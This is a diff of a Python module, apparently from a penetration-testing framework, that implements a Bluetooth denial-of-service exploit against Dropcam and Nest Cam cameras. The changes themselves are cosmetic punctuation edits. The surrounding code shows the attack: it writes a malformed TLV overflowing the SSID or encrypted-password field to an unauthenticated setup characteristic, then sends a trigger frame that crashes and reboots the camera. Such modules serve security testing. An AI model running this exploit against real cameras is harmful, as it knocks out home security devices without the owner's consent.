@@ -7,13 +7,13 @@ writing a TLV where the declared length is short but the actual value is
 much longer. The camera crashes and reboots.
 
 Two variants implemented:
-  ssid       — overflow via SSID parameter
-  encpass    — overflow via encrypted-password parameter
+  ssid      , overflow via SSID parameter
+  encpass   , overflow via encrypted-password parameter
 
 Affected: Dropcam, Dropcam Pro, Nest Cam Indoor/Outdoor (firmware 5.2.1).
 Bluetooth never disables, even after Wi-Fi setup completes.
 
-Pure passive BLE GATT write — no auth/pairing required.
+Pure passive BLE GATT write, no auth/pairing required.
 """
 
 import asyncio
@@ -136,7 +136,7 @@ class Module(DosModule):
                 if not client.is_connected:
                     print_error("Failed to connect")
                     return False
-                print_success(f"Connected — writing {len(payload)} bytes to handle 0x{handle:04X}")
+                print_success(f"Connected, writing {len(payload)} bytes to handle 0x{handle:04X}")
 
                 # Write malformed TLV to setup characteristic
                 try:
@@ -144,14 +144,14 @@ class Module(DosModule):
                     hex_str = " ".join(f"{b:02X}" for b in payload[:16])
                     print(f"  payload: {hex_str}{' ...' if len(payload) > 16 else ''}")
                 except BleakError as e:
-                    print_warning(f"Write returned: {e}  (continuing — may have triggered)")
+                    print_warning(f"Write returned: {e}  (continuing, may have triggered)")
 
-                # Send trailing trigger frame (0x3B) — original PoC's second write
+                # Send trailing trigger frame (0x3B), original PoC's second write
                 try:
                     await client.write_gatt_char(handle, _TRIGGER_FRAME, response=False)
                     print_success("Trigger frame sent  (camera should reboot)")
                 except BleakError:
-                    print_info("Trigger frame failed — target likely already crashed")
+                    print_info("Trigger frame failed, target likely already crashed")
 
                 return True
         except BleakError as e:
@@ -183,7 +183,7 @@ class Module(DosModule):
         print(f"  {C.RED}╚{'═'*55}╝{C.RESET}\n")
         print_info(f"Target  : {target}")
         print_info(f"Variant : {variant}    Handle: 0x{handle:04X}")
-        print_warning("Authorized testing only — target camera will reboot")
+        print_warning("Authorized testing only, target camera will reboot")
 
         try:
             ok = asyncio.run(self._exploit(target, variant, handle, length, timeout))
